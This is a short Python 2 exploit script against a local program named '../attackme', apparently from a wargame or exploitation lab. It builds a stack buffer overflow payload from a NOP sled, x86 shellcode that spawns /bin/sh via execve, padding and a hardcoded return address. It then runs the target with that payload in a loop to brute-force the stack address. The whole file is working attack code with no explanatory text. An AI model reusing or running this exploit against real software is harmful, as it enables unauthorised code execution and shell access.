import os
from struct import *

p = lambda x : pack("<L", x)

target = "../attackme" 
ret = 0xbffff3a0
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
Nsled = "\x90"*(264-16-len(sc))

payload = ""
payload += Nsled
payload += sc
payload += "\x90"*20
payload += p(ret)

i = 1
while i < 50:
    #os.execv(target, (target, payload)) There is no reason to repeat...
    os.system(target+" "+payload)
    i = i + 1